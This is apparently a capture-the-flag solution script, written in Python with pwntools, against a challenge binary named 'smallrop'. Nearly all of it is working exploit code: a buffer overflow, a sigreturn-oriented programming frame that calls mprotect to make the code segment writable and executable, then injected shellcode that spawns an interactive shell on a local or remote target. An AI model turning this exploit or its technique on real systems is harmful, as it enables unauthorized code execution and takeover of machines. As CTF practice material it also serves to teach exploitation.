#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('./challenge/smallrop')
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process(stdin=PTY)

vuln = lambda data: p.sendafter(b"> ", data)
syscall_into_vuln = 0x40100a
syscall_ret = 0x40103a

p = conn()

# trigger SROP to call mprotect(0x401000, 0x1000, RWX)
# making the code segment writable
# immediately after (the syscall) it goes into vuln() to read another buffer
# this time rsi=[rsp-0x80] -> directly after "syscall" instruction
# so we write shellcode that gets executed immediately

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = 0x401000
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = syscall_into_vuln
frame.rsp = syscall_ret+2 + 0x80    # write shellcode to directly after "syscall"

payload  = b"A"*0x80
payload += p64(e.sym.vuln)
payload += p64(syscall_ret)
payload += bytes(frame)
vuln(payload)

# eax=0xf (SYS_rt_sigreturn)
vuln(b"X"*0xf)

vuln(asm(shellcraft.linux.sh()))
p.interactive()
